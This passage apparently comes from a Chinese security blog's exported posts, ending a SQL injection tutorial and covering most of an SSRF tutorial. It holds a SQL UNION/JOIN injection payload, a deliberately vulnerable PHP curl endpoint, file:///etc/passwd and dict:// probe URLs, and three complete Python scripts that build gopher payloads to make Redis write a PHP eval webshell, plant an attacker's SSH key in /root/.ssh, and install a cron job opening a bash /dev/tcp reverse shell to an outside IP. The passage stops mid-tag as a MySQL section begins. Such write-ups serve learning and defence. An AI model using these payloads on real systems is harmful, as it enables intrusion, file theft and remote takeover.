title=\"五、无列名注入：\"></a>五、无列名注入：</h2><p>当<code>information_schema(MySQL&gt;=5)</code>被过滤，我们无法获得table_schema，table_name，column_name等信息。在5.6.x过后，MySQL默认引擎换成了innodb，innodb增加了两张新表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>,在<code>innodb_table_stats</code>表中保存了数据库变动的记录，也就是可以看到新创建或者更改的数据库的表。</p>\n<p>所以在注入的过程中，我们使用<code>innodb_table_stats</code>来Bypass information获取表名，但是这种方法看不了列名，所以出现了无列名注入</p>\n<h3 id=\"原理：-6\"><a href=\"#原理：-6\" class=\"headerlink\" title=\"原理：\"></a>原理：</h3><p>当进行联合查询的时候，会生成一个名为1，2，3，4的表</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130211424.png\" alt></p>\n<p>我们可以用反引号将前面的数字括起来，会把该数字当做一个列查询</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130212647.png\" alt></p>\n<p>当反引号被过滤的时候，我们可以采取别名的方式来进行，命名时的<code>as</code>可以省略</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20201130212726104.png\" alt></p>\n<h1 id=\"一些小Ticks：\"><a href=\"#一些小Ticks：\" class=\"headerlink\" title=\"一些小Ticks：\"></a>一些小Ticks：</h1><ol>\n<li><p>当<code>,</code>被过滤，我们可以使用join函数：</p>\n<blockquote>\n<p>join：把表之间的内容链接起来</p>\n</blockquote>\n</li>\n</ol>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130214617.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Payload：select * from users where id = &apos;1&apos; union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c join (select 4)d;</span><br></pre></td></tr></table></figure>\n\n","categories":["Summary"],"tags":["SQL","web"]},{"title":"SSRF从0到0.5","url":"http://yoursite.com/2020/10/12/SSRF从0到1/","content":"<h1 id=\"一、SSRF介绍\"><a href=\"#一、SSRF介绍\" class=\"headerlink\" title=\"一、SSRF介绍\"></a>一、SSRF介绍</h1><p>SSRF（Server-side Request Forge, 服务端请求伪造）。</p>\n<p>通常由攻击者在web端构造攻击链接后发送到服务端执行，从而达到外网探测信息或者作为跳板攻击内网服务。</p>\n<h1 id=\"二、SSRF产生\"><a href=\"#二、SSRF产生\" class=\"headerlink\" title=\"二、SSRF产生\"></a>二、SSRF产生</h1><p>SSRF漏洞经常出现在<strong>远程加载文件</strong>的场景中：比如某网站存在从远程加载图片到本地，一般他们的url如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</span><br></pre></td></tr></table></figure>\n\n<p>其中网站的流程如下：</p>\n<blockquote>\n<p>用户先输入图片的地址-&gt;在服务端解析图片地址-&gt;服务端段获取链接地址的图片数据-&gt;把获取到的图片数据加载到前台显示</p>\n</blockquote>\n<p>当把请求发送到服务端时，系统没有校验用户的输入是不是合法的参数，所以导致了SSRF漏洞的产生。</p>\n<p>在真实的环境中，我们通常利用以下的关键字进行进行查找和判断SSRF漏洞：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">share, wap, url, link, src, source, target, u, 3g, display, sourceURl, imageURL, domain</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"三、SSRF后端实现以及利用\"><a href=\"#三、SSRF后端实现以及利用\" class=\"headerlink\" title=\"三、SSRF后端实现以及利用\"></a>三、SSRF后端实现以及利用</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//简单的SSRF后端 phpstudy能用 linux不能</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?PHP</span></span><br><span class=\"line\">$ch = curl_init(); </span><br><span class=\"line\">curl_setopt($ch, CURLOPT_URL, $_GET[<span class=\"string\">'url'</span>]); </span><br><span class=\"line\"><span class=\"comment\">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class=\"line\">curl_setopt($ch, CURLOPT_HEADER, <span class=\"number\">0</span>); </span><br><span class=\"line\"><span class=\"comment\">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class=\"line\">curl_exec($ch); </span><br><span class=\"line\">curl_close($ch);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在SSRF中我们通常使用gopher、dict、file、ftp协议，来对文件进行服务、内网的信息探测以及内网的攻击</p>\n<h2 id=\"File协议\"><a href=\"#File协议\" class=\"headerlink\" title=\"File协议:\"></a>File协议:</h2><p>我们可以用file协议来读取文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Dict协议：\"><a href=\"#Dict协议：\" class=\"headerlink\" title=\"Dict协议：\"></a>Dict协议：</h2><p>DIct协议通常用来探测端口，当端口打开时会返回端口的banner信息，当端口关闭了，页面会返回为空</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/ssrf.php?url=dict://10.24.36.14:22</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214184714.png\" alt><br><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214190644.png\" alt></p>\n<h2 id=\"Gopher协议：\"><a href=\"#Gopher协议：\" class=\"headerlink\" title=\"Gopher协议：\"></a>Gopher协议：</h2><p>Gopher协议可以说是SSRF中最为关键的一环。Gopher会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等，同时数据部分必须要进行url编码，这样Gopher协议才能正确解析。</p>\n<p>Gopher的默认格式为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://127.0.0.1:70/_ + TCP/IP数据</span><br></pre></td></tr></table></figure>\n\n<p>如果没指定端口，Gopher的默认端口为70，当访问<code>gopher：//127.0.0.1/_Aruk4s</code>时，收到的消息为：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214191124.png\" alt></p>\n<p><code>_</code>这个符号是在这里起一个连接的方式，所有的字符都可以。</p>\n<p>而实现访问内网或者直接穿刺内网的原理就是通过SSRF漏洞在服务器本地发送GET或者POST等一些请求</p>\n<h3 id=\"SSRF与Redis：\"><a href=\"#SSRF与Redis：\" class=\"headerlink\" title=\"SSRF与Redis：\"></a>SSRF与Redis：</h3><p>redis采用的是<code>RESP</code>协议。</p>\n<blockquote>\n<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>\n<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>\n<ol>\n<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>\n<li>服务器根据命令实现回复一种RESP类型。</li>\n</ol>\n<p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\\r\\n&quot;(CRLF)</code>结束。</p>\n</blockquote>\n<p>首先模拟redis的操作</p>\n<p>先用<code>tcpdump</code>抓取一个流量包：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i lo -l port 6379 -w redis.pcap</span><br></pre></td></tr></table></figure>\n\n<p>在redis客户端中执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set flag test</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; get flag</span><br><span class=\"line\">&quot;test&quot;</span><br></pre></td></tr></table></figure>\n\n<p>抓到的数据如下：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214195654.png\" alt></p>\n<p>转为hex转储：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214195816.png\" alt></p>\n<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>\n<p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”flag”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\\r\\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>\n<h4 id=\"通过gopher进行攻击\"><a href=\"#通过gopher进行攻击\" class=\"headerlink\" title=\"通过gopher进行攻击\"></a>通过gopher进行攻击</h4><p>当攻击者能通过<strong>未授权</strong>或者<strong>弱口令访问到redis服务器</strong>的时候，可以通过gopher模拟本地服务器的操作，对redis进行一系列的攻击</p>\n<h5 id=\"1-绝对路径写shell：\"><a href=\"#1-绝对路径写shell：\" class=\"headerlink\" title=\"1. 绝对路径写shell：\"></a>1. 绝对路径写shell：</h5><p>先构造redis命令，通过<code>dir</code>命令redis的工作目录为web的根目录，然后设定dbfilename为shell.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall</span><br><span class=\"line\">set 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;</span><br><span class=\"line\">config set dir /var/www/html</span><br><span class=\"line\">config set dbfilename shell.php</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>在用python脚本（网上找的）将命令转化成gopher协议的格式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">protocol=<span class=\"string\">\"gopher://\"</span></span><br><span class=\"line\">ip=<span class=\"string\">\"10.24.36.14\"</span></span><br><span class=\"line\">port=<span class=\"string\">\"6379\"</span></span><br><span class=\"line\">shell=<span class=\"string\">\"\\n\\n&lt;?php eval($_GET[\\\"cmd\\\"]);?&gt;\\n\\n\"</span></span><br><span class=\"line\">filename=<span class=\"string\">\"shell.php\"</span></span><br><span class=\"line\">path=<span class=\"string\">\"/var/www/html\"</span></span><br><span class=\"line\">passwd=<span class=\"string\">\"\"</span></span><br><span class=\"line\">cmd=[<span class=\"string\">\"flushall\"</span>,</span><br><span class=\"line\">     <span class=\"string\">\"set 1 &#123;&#125;\"</span>.format(shell.replace(<span class=\"string\">\" \"</span>,<span class=\"string\">\"$&#123;IFS&#125;\"</span>)),</span><br><span class=\"line\">     <span class=\"string\">\"config set dir &#123;&#125;\"</span>.format(path),</span><br><span class=\"line\">     <span class=\"string\">\"config set dbfilename &#123;&#125;\"</span>.format(filename),</span><br><span class=\"line\">     <span class=\"string\">\"save\"</span></span><br><span class=\"line\">     ]</span><br><span class=\"line\"><span class=\"keyword\">if</span> passwd:</span><br><span class=\"line\">    cmd.insert(<span class=\"number\">0</span>,<span class=\"string\">\"AUTH &#123;&#125;\"</span>.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+<span class=\"string\">\":\"</span>+port+<span class=\"string\">\"/_\"</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">redis_format</span><span class=\"params\">(arr)</span>:</span></span><br><span class=\"line\">    CRLF=<span class=\"string\">\"\\r\\n\"</span></span><br><span class=\"line\">    redis_arr = arr.split(<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">    cmd=<span class=\"string\">\"\"</span></span><br><span class=\"line\">    cmd+=<span class=\"string\">\"*\"</span>+str(len(redis_arr))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> redis_arr:</span><br><span class=\"line\">        cmd+=CRLF+<span class=\"string\">\"$\"</span>+str(len((x.replace(<span class=\"string\">\"$&#123;IFS&#125;\"</span>,<span class=\"string\">\" \"</span>))))+CRLF+x.replace(<span class=\"string\">\"$&#123;IFS&#125;\"</span>,<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">    cmd+=CRLF</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cmd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">        payload += urllib.quote(redis_format(x))</span><br><span class=\"line\">    <span class=\"keyword\">print</span> payload</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214202240.png\" alt></p>\n<p>然后尝试打一波：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214210344.png\" alt></p>\n<p>写入成功：</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214210442.png\" alt></p>\n<blockquote>\n<p>在github上面有一款叫<a href=\"https://github.com/tarunkant/Gopherus\" target=\"_blank\" rel=\"noopener\">Gopherus</a>的工具可以简化这个流程</p>\n</blockquote>\n<h5 id=\"2-写入ssh公钥：\"><a href=\"#2-写入ssh公钥：\" class=\"headerlink\" title=\"2. 写入ssh公钥：\"></a>2. 写入ssh公钥：</h5><p>现在本地生成一对密钥</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152516.png\" alt></p>\n<p>然后通过脚本在将密钥写入目标服务器</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">protocol=<span class=\"string\">\"gopher://\"</span></span><br><span class=\"line\">ip=<span class=\"string\">\"10.24.36.14\"</span></span><br><span class=\"line\">port=<span class=\"string\">\"6379\"</span></span><br><span class=\"line\">filename=<span class=\"string\">\"authorized_keys\"</span></span><br><span class=\"line\">ssh_pub=<span class=\"string\">\"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbAATnZlINjEGF3NBhMzi6sqa7G7HX8r/hcLwfaEZLq9DK0ntwalZm2PbHlo4TuMlRuwzwUzAAUTUXL40NPtNvdGsJs5Vdh1UynSqcw2apCUup+8Jrki8udIMNjcIDIIF37+PlFAChkOkQTG1XoajFLvd9yenxWa41dwkBhhZDO/bSLBOyutnQyr5amgAPHMnBlz/7hABRb7aCn5GbGIh+lnDrYFTRNkOA2Io8T4XGUDh/Tb1FpW+CU2SKNmEaEClsaR2yCfS4xojMjcyzFX8u9x7FMZmmJknjzfqoni1hLaN5KXgbIbFgl24x/mS+XFeMP4RjFDoGwUC/NB+7XTkOCloO7tFxBafKPcXdc/6B8bflCBHPimBeGMqLJNApDHcHGy4rwX1U1022VP9iz0isxa71zPVXvrW3wxKAVd/u9Kjd+wjIzd4NFu/dZcBiNYJ8fu8nz0pjOSa6a4cryk9sRsNhapTynF5fRG7ivI5XSKZDQ8GeJ+EeD943E98XcX8= root@Kali\"</span></span><br><span class=\"line\"><span class=\"comment\">#公钥填入自己的</span></span><br><span class=\"line\">path=<span class=\"string\">\"/root/.ssh/\"</span></span><br><span class=\"line\"><span class=\"comment\">#shell=\"\\n\\n&lt;?php eval($_GET[\\\"cmd\\\"]);?&gt;\\n\\n\"</span></span><br><span class=\"line\"><span class=\"comment\">#filename=\"shell1.php\"</span></span><br><span class=\"line\"><span class=\"comment\">#path=\"/var/www/html\"</span></span><br><span class=\"line\">passwd=<span class=\"string\">\"\"</span></span><br><span class=\"line\">cmd=[<span class=\"string\">\"flushall\"</span>,</span><br><span class=\"line\">     <span class=\"string\">\"set 1 &#123;&#125;\"</span>.format(ssh_pub.replace(<span class=\"string\">\" \"</span>,<span class=\"string\">\"$&#123;IFS&#125;\"</span>)),</span><br><span class=\"line\">     <span class=\"string\">\"config set dir &#123;&#125;\"</span>.format(path),</span><br><span class=\"line\">     <span class=\"string\">\"config set dbfilename &#123;&#125;\"</span>.format(filename),</span><br><span class=\"line\">     <span class=\"string\">\"save\"</span></span><br><span class=\"line\">     ]</span><br><span class=\"line\"><span class=\"keyword\">if</span> passwd:</span><br><span class=\"line\">    cmd.insert(<span class=\"number\">0</span>,<span class=\"string\">\"AUTH &#123;&#125;\"</span>.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+<span class=\"string\">\":\"</span>+port+<span class=\"string\">\"/_\"</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">redis_format</span><span class=\"params\">(arr)</span>:</span></span><br><span class=\"line\">    CRLF=<span class=\"string\">\"\\r\\n\"</span></span><br><span class=\"line\">    redis_arr = arr.split(<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">    cmd=<span class=\"string\">\"\"</span></span><br><span class=\"line\">    cmd+=<span class=\"string\">\"*\"</span>+str(len(redis_arr))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> redis_arr:</span><br><span class=\"line\">        cmd+=CRLF+<span class=\"string\">\"$\"</span>+str(len((x.replace(<span class=\"string\">\"$&#123;IFS&#125;\"</span>,<span class=\"string\">\" \"</span>))))+CRLF+x.replace(<span class=\"string\">\"$&#123;IFS&#125;\"</span>,<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">    cmd+=CRLF</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cmd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">        payload += urllib.quote(redis_format(x))</span><br><span class=\"line\">    <span class=\"keyword\">print</span> payload</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152725.png\" alt></p>\n<p>在运用<code>curl</code>进行攻击</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152656.png\" alt></p>\n<p>查看是否成功写入</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152836.png\" alt></p>\n<p>尝试连接</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216153001.png\" alt></p>\n<p>连接成功</p>\n<h5 id=\"3-contrab计划任务反弹shell：\"><a href=\"#3-contrab计划任务反弹shell：\" class=\"headerlink\" title=\"3. contrab计划任务反弹shell：\"></a>3. contrab计划任务反弹shell：</h5><p>反弹shell的要求更加严格。只能在<code>Centos</code>上使用，<code>ubuntu</code>不行。因为redis写文件后，该文件的<strong>默认权限是644</strong>。但是ubuntu执行定时任务<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，要求定时任务的权限必须是<code>-rw-------</code>，即600，所以ubuntu无法实现。而<code>Centos</code>可以执行<strong>权限为644</strong>的定时任务<code>/var/spool/cron/&lt;username&gt;</code>。</p>\n<p>同时因为redis保存RDB会出现乱码，在Ubuntu上面会发生报错，而Centos不会</p>\n<blockquote>\n<p>Ubuntu定时任务：<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos定时任务：<code>/var/spool/cron/&lt;username&gt;</code></p>\n<p>Centos和Ubuntu均存在<code>/etc/crontab</code>（该文件需要root权限，但是高版本redis默认启动是redis权限）</p>\n</blockquote>\n<p>Payload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">protocol=<span class=\"string\">\"gopher://\"</span></span><br><span class=\"line\">ip=<span class=\"string\">\"10.16.13.153\"</span></span><br><span class=\"line\">port=<span class=\"string\">\"6379\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#定时任务反弹shell</span></span><br><span class=\"line\">reverse_ip=<span class=\"string\">\"192.168.163.132\"</span></span><br><span class=\"line\">reverse_port=<span class=\"string\">\"2333\"</span></span><br><span class=\"line\">cron=<span class=\"string\">\"\\n\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\n\\n\\n\\n\"</span>%(reverse_ip,reverse_port)</span><br><span class=\"line\">filename=<span class=\"string\">\"root\"</span></span><br><span class=\"line\">path=<span class=\"string\">\"/var/spool/cron\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#写入公钥</span></span><br><span class=\"line\"><span class=\"comment\">#filename=\"authorized_keys\"</span></span><br><span class=\"line\"><span class=\"comment\">#ssh_pub=\"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLykSx6ZMaduFsXjrzKMpEqe2oa5iV6dvy4HKui9/Cj1u66n3h3H6cEkyd5Dip01BFRp7KOhyGKfPcjX43E9CTRTj7aIP7+CrmUaS3st6+a5ZfZy8wcv7U4tQywlQVFhGkii83/V4dPusahnLpEfnt29o80JKq7oInrjXEbGx7h8rXhDfgdBLYU1hfybTfBvot2G4enQgGrVbjZfDMCJhH4u5sH0J1u698zc8FLe2uHv4KQ56CjD1WFayz8mB4gSaOxlSQvwbAywqQx6bcEkm5ASKE1ffbJ8st9dtUKC7bqsWTshqdFBKoljkSSkJqkV1yq06uhcTna03RnzLK0Yul7lVAWQ0eZdaExwxAvvNtDyzFJrbwShOH+EZb9hVUmnWe6ffh3OaitHKvFsvA09w4uaaItC5ZQhIhp3dvEQj5WpMD3NftEvbz2fIs2OglsWyF/Ix8QTPZBlZiUQkX9f0cDreBPtgFpGbgn4mVzayaAeHeXAaXHO77aiSA7WAvnPc= root@kali\"</span></span><br><span class=\"line\"><span class=\"comment\">#公钥填入自己的</span></span><br><span class=\"line\"><span class=\"comment\">#path=\"/root/.ssh/\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#写shell</span></span><br><span class=\"line\"><span class=\"comment\">#shell=\"\\n\\n&lt;?php eval($_GET[\\\"cmd\\\"]);?&gt;\\n\\n\"</span></span><br><span class=\"line\"><span class=\"comment\">#filename=\"shell1.php\"</span></span><br><span class=\"line\"><span class=\"comment\">#path=\"/var/www/html\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">passwd=<span class=\"string\">\"\"</span></span><br><span class=\"line\">cmd=[<span class=\"string\">\"flushall\"</span>,</span><br><span class=\"line\">     <span class=\"string\">\"set 1 &#123;&#125;\"</span>.format(cron.replace(<span class=\"string\">\" \"</span>,<span class=\"string\">\"$&#123;IFS&#125;\"</span>)),</span><br><span class=\"line\">     <span class=\"string\">\"config set dir &#123;&#125;\"</span>.format(path),</span><br><span class=\"line\">     <span class=\"string\">\"config set dbfilename &#123;&#125;\"</span>.format(filename),</span><br><span class=\"line\">     <span class=\"string\">\"save\"</span></span><br><span class=\"line\">     ]</span><br><span class=\"line\"><span class=\"keyword\">if</span> passwd:</span><br><span class=\"line\">    cmd.insert(<span class=\"number\">0</span>,<span class=\"string\">\"AUTH &#123;&#125;\"</span>.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+<span class=\"string\">\":\"</span>+port+<span class=\"string\">\"/_\"</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">redis_format</span><span class=\"params\">(arr)</span>:</span></span><br><span class=\"line\">    CRLF=<span class=\"string\">\"\\r\\n\"</span></span><br><span class=\"line\">    redis_arr = arr.split(<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">    cmd=<span class=\"string\">\"\"</span></span><br><span class=\"line\">    cmd+=<span class=\"string\">\"*\"</span>+str(len(redis_arr))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> redis_arr:</span><br><span class=\"line\">        cmd+=CRLF+<span class=\"string\">\"$\"</span>+str(len((x.replace(<span class=\"string\">\"$&#123;IFS&#125;\"</span>,<span class=\"string\">\" \"</span>))))+CRLF+x.replace(<span class=\"string\">\"$&#123;IFS&#125;\"</span>,<span class=\"string\">\" \"</span>)</span><br><span class=\"line\">    cmd+=CRLF</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cmd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">        payload += urllib.quote(redis_format(x))</span><br><span class=\"line\">    <span class=\"keyword\">print</span> payload</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"SSRF与MySQL：\"><a 